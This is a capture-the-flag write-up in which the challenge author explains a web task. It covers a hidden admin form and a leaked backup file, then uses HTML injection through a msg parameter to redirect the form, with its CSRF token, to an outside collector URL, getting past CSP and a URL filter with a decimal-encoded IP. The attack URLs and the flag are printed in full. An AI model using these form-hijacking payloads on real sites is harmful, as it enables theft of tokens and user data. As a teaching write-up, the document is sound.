Hello ALL , its me TnMch , it was really amazing event when i was helping geek guys to make this ctf cool and enjoy hacking :D

So , when i was building some task , I get the idea of this LastHope task that need a lot of skills 

So the task was first sign in/out page where you can create you account and login to the home page 


![image](https://user-images.githubusercontent.com/7364615/28757581-5ce51b22-7586-11e7-95b1-ba17d50a7e95.png)


Then when you login there is home and contact page with some fun picture :D

![image](https://user-images.githubusercontent.com/7364615/28757606-db10c26c-7586-11e7-9ee7-b5876fac757b.png)

![image](https://user-images.githubusercontent.com/7364615/28757620-1090f538-7587-11e7-8166-677c1262095c.png)



I puted this picture to give the player the chance to look more and dont focus only in this page 

So if you look in source code of home page you will see hidden form :p


![image](https://user-images.githubusercontent.com/7364615/28757628-40839124-7587-11e7-8679-90aa94441854.png)


so here where we start look deeper :p

its msg parameter which will echo anything in the home page 

![image](https://user-images.githubusercontent.com/7364615/28757646-9cb669ee-7587-11e7-8b3c-efdfb70fbffb.png)

but wait :D there is something i just added in header for smart guys :D 

![image](https://user-images.githubusercontent.com/7364615/28757649-c9fd1a38-7587-11e7-8849-494c308dee44.png)


CSP default-src 'self' so no chance to load any script into the home page ! :D did that means no chance for XSS!!

no wait lets check more always something is missing there 

using some cool staff we can get backup file /index.php.old


![image](https://user-images.githubusercontent.com/7364615/28757673-74b5655c-7588-11e7-87a9-fc52b1b54083.png)

So here we can understand that there is hidden form for admin only 

There is csrf token also , so first csp and then csrf LOOL , maybe many player will said so what we can do here its all over

 <input type="hidden" name="csrf_token" value="{$csrf_token}" />
 
 
 But there is always hope for you guys as the picture said :D
 
 our msg payload is just printed after the form balise :D so what we can do!!
 
 Did you know guys we can do alot of staff here :p
 
 Redirect submit form to our url and steal form data will not be something good :p 
 
 so if we send this url to admin :
 
 ```
 http://34.253.165.46/LocalHope/home.php?msg=</form><form method="GET" action="https://requestb.in/xxxxxx">
 ```
 
 The form will be changed to the new action , and here we can control over the form and get the data to our link 
 
 But as i am so bad :D i add some filtre here and i block any second url send with the link so no one can get data there XD
 
 But smart guys and good player will not stop here and can do more 
 
 Changing our ip url to decimal can do the job for us and bypass the filtre 
 
 exp :  34.253.165.46 will be  587048238
 
 So our link can be 
 ```
  http://34.253.165.46/LocalHope/home.php?msg=</form><form method="GET" action="http://587048238:8080">
```
And all filtre bypassed :D 

YUP , just we get the flag

![image](https://user-images.githubusercontent.com/7364615/28757773-6c1176dc-758a-11e7-91d7-aa17fdc5a8db.png)


FLAG : Bugs_Bunny{Oh_You_FFirst_Find_Me_And_Bypass_My_CSP_:((!!}


HOPE YOU GUYS ENJOYED MY WEB TASK :D 
see you next year


BTW it was soled by only 2 team : 

![image](https://user-images.githubusercontent.com/7364615/28776758-5e7edbe0-75f8-11e7-88e6-8756a269c6ec.png)

